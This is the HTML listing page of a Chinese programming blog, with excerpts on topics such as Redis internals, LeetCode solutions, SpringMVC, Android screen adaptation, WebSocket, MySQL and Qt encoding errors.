<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c0ea5b22b49ce0f7e17ad97865fdbe2/" rel="bookmark">
			概率和统计学知识汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		综述 本文总结了机器学习中经常遇到的概率统计中的一些基础概念，在平时经常遇到写下来供自己以后查阅。
清单 样本均值
数学期望
期望
方差
样本方差 协方差
最大似然与最大后验
共轭先验
偏差和方差
样本均值 现在我们拿到了 n n 个样本，每个样本的观测值为XiXi则样本均值指的是 1n∑ni=1Xi 1 n ∑ i = 1 n X i ,也就是求n个观测值的平均值。
数学期望 数学期望就是样本均值，因为我们不知道拿到多少样本，所以数学期望的值是不确定的。
期望 针对一个事件不管他的样本数量多少，我们认为它的期望是个固定值。可以通过以下方式得到： Ex∼P[f(x)]=∑xp(x)f(x) E x ∼ P [ f ( x ) ] = ∑ x p ( x ) f ( x ) Ex∼P[f(x)]=∫p(x)f(x)dx E x ∼ P [ f ( x ) ] = ∫ p ( x ) f ( x ) d x 观察公式发现，期望的观测值取决于数据的观测值 f(x) f ( x ) 及其概率 P P 。在很多情况下，我们估测样本的期望是比较困难的，所以我们一般把期望估计成样本期望。 方差 方差的计算公式为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c0ea5b22b49ce0f7e17ad97865fdbe2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/831f52cae6574422e7109d40de1f3fe3/" rel="bookmark">
			Redis源码剖析之命令执行核心
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下涉及到的源码均为redis5.0-rc3版本的代码【点击查看官方源码】
文章目录 Redis命令执行命令执行附加标识核心函数CALL的源码 Redis命令执行 Redis执行命令时都会先建立一个客户端，然后由客户端去和服务器连接，在执行命令（使用lua脚本执行亦如此，只不过lua的客户端是个伪客户端而已）。redis的命令执行中有一个核心部分，就是call()方法，call函数声明如下：
void call(client *c, int flags) 可见有两个参数，client是代表客户端（redis的命令执行都是以客户端向服务端发送的方式，请求执行的一方即为客户端）；flags是一个特殊标识。
命令执行附加标识 call方法的flags标识可以设置以下情况的值：
flags宏定义值描述CMD_CALL_NONE代表不设标识CMD_CALL_SLOWLOG有此标识的时候，会去检查命令的执行速度，以便决策是否加入慢日志中CMD_CALL_STATS统计命令被执行的数量CMD_CALL_PROPAGATE_AOF如果命令会改变值或客户端强制命令传播，则将命令追加到AOF文件CMD_CALL_PROPAGATE_REPL如果命令会改变值或客户端强制命令传播，则将命令传播给服务器的从节点CMD_CALL_PROPAGATEPROPAGATE_AOF和PROPAGATE_REPL两个标识的别名CMD_CALL_FULLSLOWLOG,STATS,PROPAGATE三个标识的别名 而在执行传播的行为上会依赖客户端的flags，特殊的情况如下：
如果客户端的标识为CLIENT_FORCE_AOF或者CLIENT_FORCE_REPL，而call方法设置的flags为CMD_CALL_PROPAGATE_AOF/REPL，这种情况下即便命令没有改变值也会被传播。如果客户端的flags被设置成CLIENT_PREVENT_REPL_PROP 或 CLIENT_PREVENT_AOF_PROP，基本执行的命令会影响数据库值，那么也不会被传播给从节点，同样亦不会被追加写入AOF文件。 但是有点需要注明的是，无论客户端的标识设置的是什么，如果call函数的flags没有被设置成CMD_CALL_PROPAGATE_AOF或 CMD_CALL_PROPAGATE_REPL，那么AOF命令追加和从节点复制都将永远不会发生；
客户端（client）的flags可以被如下API修改：
forceCommandPropagation(client *c, int flags); preventCommandPropagation(client *c); preventCommandAOF(client *c); preventCommandReplication(client *c); 核心函数CALL的源码 call函数的具体实现如下：
void call(client *c, int flags) { long long dirty, start, duration; int client_old_flags = c-&gt;flags; //将命令发送至监视器节点的客户端（仅当这些命令不是从aof中读取的时候） if (listLength(server.monitors) &amp;&amp; !server.loading &amp;&amp; !(c-&gt;cmd-&gt;flags &amp; (CMD_SKIP_MONITOR|CMD_ADMIN))) { replicationFeedMonitors(c,server.monitors,c-&gt;db-&gt;id,c-&gt;argv,c-&gt;argc); } /* Initialization: clear the flags that must be set by the command on * demand, and initialize the array for additional commands propagation.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/831f52cae6574422e7109d40de1f3fe3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e38f5a15e3a244964c7d5be5aaf99ada/" rel="bookmark">
			C/C&#43;&#43;代码：递归遍历当前文件夹下的文件和子文件夹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;iostream&gt; #include &lt;io.h&gt; #include &lt;string&gt; using namespace std; void listFiles(const char * dir,int tab); int main() { string dir; cout &lt;&lt; "Enter a directory (ends with \'\\\'): "; cin&gt;&gt;dir; dir += "*.*"; // 在要遍历的目录后加上通配符 listFiles(dir.c_str(),0); cout &lt;&lt; "Done!\n"; system("pause"); return 0; } void listFiles(const char * dir,int tab) { intptr_t handle; _finddata_t findData; handle = _findfirst(dir, &amp;findData); // 查找目录中的第一个文件 if (handle == -1) { cout &lt;&lt; "Failed to find first file!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e38f5a15e3a244964c7d5be5aaf99ada/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24db3cb19e9a17499da696f7ce1d2718/" rel="bookmark">
			LeetCode 236. 二叉树的最近公共祖先(C&#43;&#43;)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个二叉树, 找到该树中两个指定节点的最近公共祖先。
百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”
例如，给定如下二叉树: root = [3,5,1,6,2,0,8,null,null,7,4]
_______3______ / \ ___5__ ___1__ / \ / \ 6 _2 0 8 / \ 7 4 示例 1:
输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1 输出: 3 解释: 节点 5 和节点 1 的最近公共祖先是节点 3。 示例 2:
输入: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4 输出: 5 解释: 节点 5 和节点 4 的最近公共祖先是节点 5。因为根据定义最近公共祖先节点可以为节点本身。 说明:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24db3cb19e9a17499da696f7ce1d2718/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8faa4d693688530fe0dc69209d2b9d88/" rel="bookmark">
			LeetCode 230. 二叉搜索树中第K小的元素(C&#43;&#43;)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个二叉搜索树，编写一个函数 kthSmallest 来查找其中第 k 个最小的元素。
说明： 你可以假设 k 总是有效的，1 ≤ k ≤ 二叉搜索树元素个数。
示例 1:
输入: root = [3,1,4,null,2], k = 1 3 / \ 1 4 \ 2 输出: 1 示例 2:
输入: root = [5,3,6,2,4,null,null,1], k = 3 5 / \ 3 6 / \ 2 4 / 1 输出: 3 进阶： 如果二叉搜索树经常被修改（插入/删除操作）并且你需要频繁地查找第 k 小的值，你将如何优化 kthSmallest 函数？
思路： 对于一个二叉搜索树，其中序遍历的结果就是二叉树各个节点值按照从小到大进行排列的结果。
/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */ class Solution { vector&lt;int&gt; vec; public: void dfs(TreeNode* root){ if(root == NULL) return ; dfs(root-&gt;left); vec.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8faa4d693688530fe0dc69209d2b9d88/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6202b6813d9ee14e4fd3b496a92cc1e/" rel="bookmark">
			SpringMVC-日期转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在做web开发的时候，页面传入的都是String类型，SpringMVC可以对一些基本的类型进行转换，但是对于日期类的转换可能就需要我们配置。
1、如果查询类使我们自己写，那么在属性前面加上@DateTimeFormat(pattern = "yyyy-MM-dd") ，即可将String转换为Date类型，如下
1
2
@DateTimeFormat(pattern = "yyyy-MM-dd")
private Date createTime;
2、如果我们只负责web层的开发，就需要在controller中加入数据绑定：
1
2
3
4
5
@InitBinder
public void initBinder(WebDataBinder binder) {
SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
dateFormat.setLenient(false);
binder.registerCustomEditor(Date.class, new CustomDateEditor(dateFormat, true)); //true:允许输入空值，false:不能为空值
3、可以在系统中加入一个全局类型转换器
实现转换器
1
2
3
4
5
6
7
8
9
10
11
12
public class DateConverter implements Converter&lt;String, Date&gt; {
@Override
public Date convert(String source) {
SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
dateFormat.setLenient(false);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6202b6813d9ee14e4fd3b496a92cc1e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ef95b4bce2b68624032959760ad19d3/" rel="bookmark">
			Android 全面屏适配及判断是否为全面屏，全面屏手势和虚拟导航栏的判断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一，全面屏的适配
全面屏出现后，如果不做适配，屏幕上会出现上下黑边，影响视觉效果。
针对此问题，Android官方提供了适配方案，即提高App所支持的最大屏幕纵横比，实现起来也比较简单，在AndroidManifest.xml中做如下配置即可，在AndroidManifet里的&lt;application&gt;下声明：
&lt;meta-data android:name="android.max_aspect" android:value="ratio_float"/&gt; 将ratio_float设置为2.1即可适配一众全面屏手机，即：
&lt;meta-data android:name="android.max_aspect" android:value="2.1" /&gt; 二，判断是否为全面屏
很多的手机是有虚拟导航栏的，特别是华为手机，有人提议通过判断是否含有虚拟导航栏，不就可以判断是否为全面屏了吗？
/** * 判断设备是否存在NavigationBar(虚拟导航栏) * * @return true 存在, false 不存在 */ public static boolean deviceHasNavigationBar() { boolean haveNav = false; try { //1.通过WindowManagerGlobal获取windowManagerService // 反射方法：IWindowManager windowManagerService = WindowManagerGlobal.getWindowManagerService(); Class&lt;?&gt; windowManagerGlobalClass = Class.forName("android.view.WindowManagerGlobal"); Method getWmServiceMethod = windowManagerGlobalClass.getDeclaredMethod("getWindowManagerService"); getWmServiceMethod.setAccessible(true); //getWindowManagerService是静态方法，所以invoke null Object iWindowManager = getWmServiceMethod.invoke(null); //2.获取windowMangerService的hasNavigationBar方法返回值 // 反射方法：haveNav = windowManagerService.hasNavigationBar(); Class&lt;?&gt; iWindowManagerClass = iWindowManager.getClass(); Method hasNavBarMethod = iWindowManagerClass.getDeclaredMethod("hasNavigationBar"); hasNavBarMethod.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ef95b4bce2b68624032959760ad19d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc331fd350fd3502b34a2452e0ef091b/" rel="bookmark">
			消费者比对RabbitMQ同步数据的解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.前言 RabbitMQ数据同步一致性解决方案中，提出了使用方案“MQ+Redis+接口”来保证数据同步的一致性，其关键在于需要对消费者已接收成功数据的唯一标识与redis中的全量唯一标识进行比对，如果存在数据丢失，需要采用接口的方式进行丢失数据补偿。 本文提供两个进行数据比对的解决方案。
2.方案一 生产者定时或实时推送数据至MQ，消费者消费数据，然后通过定时任务比对是否有丢失的数据，有则调用生产者提供的接口实时同步丢失数据。 优点： 实现简单。 缺点： 比对数据通过定时任务实现，需要依赖调度系统，系统耦合性高； 比对数据操作需要延迟一段时间以确保数据已经消费完毕； 比对数据延迟时间较长，不能解决实时性要求高的场景，且存在比对数据时数据未同步完成或未消费完成风险，造成数据比对不准确。 基于以上几点，现提出优化改进方案二。
3.方案二 生产者把本批次数据推送完成后，在redis唯一标识队列中存入-1，表示数据已推送完成； 消费者每消费一条数据，检查redis唯一标识队列是否存在-1，存在则再检查MQ队列中消息是否全部消费，若已全部消费则执行数据比对逻辑，否则不进行比对。 数据比对前置条件： 生产者数据推送完成（在对应的redis标识队列中添加-1标志）； 消费者数据消费完成（mq队列消息数量为0）； 简单实现如下：
import java.util.Properties; import java.util.concurrent.TimeUnit; import org.springframework.amqp.rabbit.core.RabbitAdmin; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.data.redis.core.RedisTemplate; import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor; import org.springframework.stereotype.Component; import lombok.extern.slf4j.Slf4j; /** * 消息比对 * @author wxyh * @date 2018/08/31 */ @Slf4j @Component public class MessageComparison { @Autowired private RabbitAdmin rabbitAdmin; @Autowired private RedisTemplate&lt;String, Object&gt; redisTemplate; @Autowired private ThreadPoolTaskExecutor asyncExecutor; /** * 比对消息 * @param queueName 消息队列名称 * @param redisKey 存放唯一标识的key */ public void compareMessage(String queueName, String redisKey) { if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc331fd350fd3502b34a2452e0ef091b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cadedbc38ac942fd5f6bd5520a6b4cb9/" rel="bookmark">
			R语言包的安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、使用install.packages(“vcd”)命令下载包。选择china（Beijing）[https]
1.1输入： install.packages("vcd")
1.2 回车后，在如下界面选择镜像站点，
1.3 选择china其中的一个包即可进行下载和安装,出现如下信息，则表示安装成功。
2、安装成功后使用 help(package = "vcd")查看vcd包的信息
3、载入程序包
点击程序包下的加载程序包，选择要加载的包即可
检验 xlsx（读取Excle）、plyr、dplyr(数据框快速计算、整合)、ggplot2（高级绘图）、cluster（聚类分析）、car是否安装。
在这里，我们首先安装并加载这些包：
查看当前加载的安装包
注意：
1）在R中安装包时可以用命令install.packages安装，也可以通过图形界面的程序包-安装程序包进行安装。
2）在R中，加载一个包时有可能会加载其他包或者因为版本问题而无法加载
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb1ff41566d140de28912b0ef32d6838/" rel="bookmark">
			搭建webSocket服务器核心
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		暑假在家研究了一下webSocket服务器
首先从webSocket原理讲解。b/s构架是基于http协议，这不是一个长连接，而且也分主动和被动。浏览器主动向服务器发出请求，等待服务器的响应到达，然后断开连接。这种方式的通信非常不适合不如聊天这种功能的实现。为了弥补这个缺陷，浏览器就有了webSocket（web套接字）这种新技术来再现socket（套接字）。但是与socket不同的是，它有发送格式的要求。
建议参考如下文章：WebSocket协议：5分钟从入门到精通 看完上一连接的文章后我对webSocket有了基本的了解，但是还是不太了解握手
接着就看了下面的文章：基于websocket的前端与后端之间的数据交互
知道了握手key的算法
但是还是不了解如何计算长度和获得内容的
于是就有下面这篇文章：WebSocket握手协议
里面有关键的代码，虽然是C/C++写的，但是还是思路是相同的
有了以上的知识储备，我就试着搭建了第一个webSocket服务器，准确的说是含有webSocket成分的服务器。我的目的是建设一个聊天服务器，已经能够在客户端实现，我还想在浏览器上实现，实现两方的三种情况都能通信，这就需要用到webSocket技术，我想在原有服务器的基础上新增几个类，用来将webSocket发来的数据帧转换成能用的格式，事实上确实成功了。
下面附上webSocket的关键代码
JAVA
用来生成握手钥匙（接着就看了下面的文章：基于websocket的前端与后端之间的数据交互）
public static String getWSSecretKey(String strWebSocketKey) {
String MAGIC_KEY = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
MessageDigest shaMD = null;
try {
strWebSocketKey = strWebSocketKey + MAGIC_KEY;
shaMD = MessageDigest.getInstance("SHA-1");
shaMD.reset();
shaMD.update(strWebSocketKey.getBytes());
} catch (NoSuchAlgorithmException e) {
e.printStackTrace();
}
byte messageDigest[] = shaMD.digest();
BASE64Encoder b64 = new BASE64Encoder();
return b64.encode(messageDigest);
}
用来和浏览器握手
public static void responseConnection(Socket s) throws IOException{
BufferedReader br=new BufferedReader(new InputStreamReader(s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb1ff41566d140de28912b0ef32d6838/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/386d56006e71cbbfb04558fa5833601a/" rel="bookmark">
			mysql 查询一张表中某个字段不同状态的数量，用于表格统计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多网站都有表格需求，可以更直观的显示数据。如下图
这种数据是怎么查出来的呢？ 其实很简单，我们先看表格中的数据
比如说我要查last_activity_time中不同时间段的设备数量，做成第一张图的表格，sql语句可以这样写
SELECT COUNT(id) AS totalCount, SUM(CASE WHEN last_active_time&gt;'2017-07-21 15:41:21' THEN 1 ELSE 0 END) AS onlineCount, SUM(CASE WHEN last_active_time&gt;'2016-07-21 15:41:21' THEN 1 ELSE 0 END) AS offline7Count, SUM(CASE WHEN last_active_time&gt;'2015-07-21 15:41:21' THEN 1 ELSE 0 END) AS offline90Count FROM android_identification ; 上面查询的第一个字段是查询这张表所有数据
第二个字段是查询last_active_time在2017-07-21 15:41:21之后的数量，意思也很好理解，如果last_active_time大于2017-07-21 15:41:21就加一，否则加零，最后求和。
第三个第四个字段同理。
是不是很简单呢
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5614abfb1bd5ba5e311bbcbb7f17aee2/" rel="bookmark">
			块级作用域与函数声明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		块级作用域与函数声明 ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明。但是，浏览器没有遵守这个规定，为了兼容以前的旧代码，还是支持在块级作用域之中声明函数，因此上面两种情况实际都能运行，不会报错。
ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6 规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。
function f() { console.log('I am outside!') } (function () { if (false) { // 重复声明一次函数f function f() { console.log('I am inside!') } } f() }()) 上面代码在 ES5 中运行，会得到“I am inside!”，因为在if内声明的函数f会被提升到函数头部，实际运行的代码如下。
// ES5 环境 function f() { console.log('I am outside!') } (function () { function f() { console.log('I am inside!') } if (false) { } f() }()) ES6 就完全不一样了，理论上会得到“I am outside!”。因为块级作用域内声明的函数类似于let，对作用域之外没有影响。但是，如果你真的在 ES6 浏览器中运行一下上面的代码，是会报错的。
如果改变了块级作用域内声明的函数的处理规则，显然会对老代码产生很大影响。为了减轻因此产生的不兼容问题，ES6 在附录 B里面规定，浏览器的实现可以不遵守上面的规定，有自己的行为方式。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5614abfb1bd5ba5e311bbcbb7f17aee2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f33af2608c64f1b7f719c2e54028d18b/" rel="bookmark">
			Vue中关于scrollTop的一些小知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1： 页面指定了DTD，即指定了DOCTYPE时，使用document.documentElement。
页面没有DTD，即没指定DOCTYPE时，使用document.body。
IE和Firefox都是如此。
2： 页面滚动选项卡
changePage(item) {
this.$nextTick(() =&gt; {
document.documentElement.scrollTop += 50;
})
console.log(document.documentElement.scrollTop)
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69eac1d78eb035fb00de367b7e54bfd1/" rel="bookmark">
			微信ios浏览器 与 iframe的不兼容问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近微信开发项目，引用iframe框内嵌一个摇奖的页面在iOS微信浏览器上显示不出来，安卓却可以显示。
因为摇奖的页面要在特定的条件才能显示出来，一开始是被隐藏display：none；的。
所以排除了一番，采用动态添加iframe框的情况就能正常显示页面。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41798732d14fef0413d46e1921a4cda5/" rel="bookmark">
			常量中有换行符
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一，常量中有换行符 如果是从别处拷贝的代码，直接放到自己的工程目录中，直接编译会遇到问题，例如：
int main(int argc, char *argv[]) { QApplication a(argc, argv); //QStringLiteral("1=项|2=补项|3=借项|4=暂")从别的地方拷贝过来的 QString str(QStringLiteral("1=项|2=补项|3=借项|4=暂")); return a.exec(); } 构建时出问题：
E:\QtWorkspace\Test\main.cpp:10: error: C2001: 常量中有换行符 问题原因：
如果是从其它地方拷贝过来的内容，会导致文件的编码格式与编译器使用的编码格式不统一，在构建时会出现问题。
解决方案：
先把Qt的默认编码格式设置为GBK编码。把出问题的文件所有的内容拷贝到一个txt文件，删除出问题的文件，再新建一个同名的文件把之前的内容拷贝进去，重新构建就可解决上面的问题。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de3c195fbef23a0655826891cb824e24/" rel="bookmark">
			把图片转换成二进制--把二进制转换成图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		把图片转换成二进制--把二进制转换成图片 private void button1_Click( object sender, EventArgs e) { string path = this .textBox1.Text; byte [] imgBytesIn = SaveImage(path); ShowImgByByte(imgBytesIn); //Parameters.Add("@Photo", SqlDbType.Binary).Value = imgBytesIn; } //将图片以二进制流 public byte [] SaveImage(String path) { FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read); //将图片以文件流的形式进行保存 BinaryReader br = new BinaryReader(fs); byte [] imgBytesIn = br.ReadBytes(( int )fs.Length); //将流读入到字节数组中 return imgBytesIn; } //现实二进制流代表的图片 public void ShowImgByByte( byte [] imgBytesIn) { MemoryStream ms = new MemoryStream(imgBytesIn); pictureBox1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de3c195fbef23a0655826891cb824e24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/82ee0d18729c07dc9bb82ff9d9545331/" rel="bookmark">
			钉钉的微应用如何测试；
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://wsdebug.dingtalk.com/
//地址打开扫描二维码；
或者用自己服务器配置在钉钉微应用链接上面，然后通过alert来测试打印的东西；
也可自己配置夜神模拟器下载，于hubuilder里面配置端口，来进行测试；
//注：用钉钉开发版来测试
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6a686c080f96abb6cf408df22da9bf49/" rel="bookmark">
			三十九、JedisCluster集成Spring
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# Spring集成JedisCluster
###1、pom.xml
&lt;dependency&gt; &lt;groupId&gt;redis.clients&lt;/groupId&gt; &lt;artifactId&gt;jedis&lt;/artifactId&gt; &lt;version&gt;2.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;4.1.7.RELEASE&lt;/version&gt; &lt;/dependency&gt; ###2、JedisClusterSpring.java
package com.yang; import java.util.HashSet; import java.util.Properties; import java.util.Set; import java.util.regex.Pattern; import org.apache.commons.pool2.impl.GenericObjectPoolConfig; import org.springframework.beans.factory.FactoryBean; import org.springframework.beans.factory.InitializingBean; import org.springframework.core.io.Resource; import redis.clients.jedis.HostAndPort; import redis.clients.jedis.JedisCluster; public class JedisClusterSpring implements FactoryBean&lt;JedisCluster&gt;, InitializingBean{ private Resource addressConfig; private String addressKeyPrefix ; private JedisCluster jedisCluster; private Integer timeout; private Integer maxRedirections; private GenericObjectPoolConfig genericObjectPoolConfig; private Pattern p = Pattern.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6a686c080f96abb6cf408df22da9bf49/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7c970323727da2d1ad327c7c86b43cf/" rel="bookmark">
			mysql删除表时报错ERROR 1051 (42S02): Unknown table &#39;...&#39;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 我报这个错误的原因是因为，之前存储引擎用的是MyISAM，后来改成InnoDB
但是删除不了表是因为之前表用的存储引擎模式还是MyISAM，删除不了。
第1种，
修改表的存储引擎： 第2种，
1.删除相应表的文件，在删除之前要确保表没有用，才能删除。 2.找到相应的库在系统中的位置，如：/var/lib/mysql/库名 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d24e6e8b7ea8344ab3c427e780df2b48/" rel="bookmark">
			随机生成一注双色球号码  - - (要求同色号码不重复 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		知识点:
new Random() . next( 33): 产生一个 0-33 (含0不含33) 的随机数 所以+1之后 , 就变成了 1-34( 1 - 33); HashSet集合:存储不重复的元素. add( E element) 往集合中添加指定元素. 增强for循环:因为不能使用索引,所以用增强for循环.
/* 双色球规则：双色球每注投注号码由6个红色球号码和1个蓝色球号码组成。 红色球号码从1—33中选择； 蓝色球号码从1—16中选择； 请随机生成一注双色球号码。（要求同色号码不重复） */ public class Test12_HashSet_$ { public static void main(String[] args) { // 创建一个集合 -- HashSet(元素不重复) HashSet&lt;Integer&gt; set = new HashSet&lt;&gt;(); // 红色6个号码 . // 创建一个Random随机数 . Random r = new Random(); /* 方法二: for (int i = 0; i &lt; 6; i++) { int s1 = r1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d24e6e8b7ea8344ab3c427e780df2b48/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e9637953168ce422f37c44ea036679c/" rel="bookmark">
			&#34;Ray, Pass me the dishes!&#34; UVALive - 3938 （线段树）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题意：给出询问a,b求出a，b区段内的最大子串
思路：
不难想象，一个区段的最大子串要么为其两个子区段的最大子串，要么第一个子串的最大后缀加上第二个子串的最大前缀。因此我们需要维护每一个串的最大前缀，最大后缀，以及最大子串。但是同时需要考虑到，子串的情况会和坐标有关，因此我们不选择直接维护子串的值，而是选择维护串的起始位置和终止位置，再通过前缀和相减来得到串的值的大小。
AC代码：
#include&lt;iostream&gt; #include&lt;cstdio&gt; #include&lt;cstring&gt; #define lson(x) x&lt;&lt;1 #define rson(x) x&lt;&lt;1|1 using namespace std; const int size=500005; typedef pair&lt;int,int&gt; Interval; typedef pair&lt;int,int&gt; pii; typedef long long LL; LL Sum[size]; struct Tree{ int l,r; pii max_sub; int max_perfix; int max_suffix; }tree[size&lt;&lt;2]; inline int md(int l,int r){return (l+r)&gt;&gt;1;} inline LL sum(pii x) { return Sum[x.second]-Sum[x.first-1]; } pii Inter_compare(pii a,pii b) { LL x=sum(a),y=sum(b); if(x!=y) return x&gt;y?a:b; return a&lt;b?a:b; } inline Tree combine(Tree a,Tree b) { Tree temp; temp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e9637953168ce422f37c44ea036679c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83090a9f3b90125d95e92dec20df9817/" rel="bookmark">
			iptables
			</a>
		</h2>
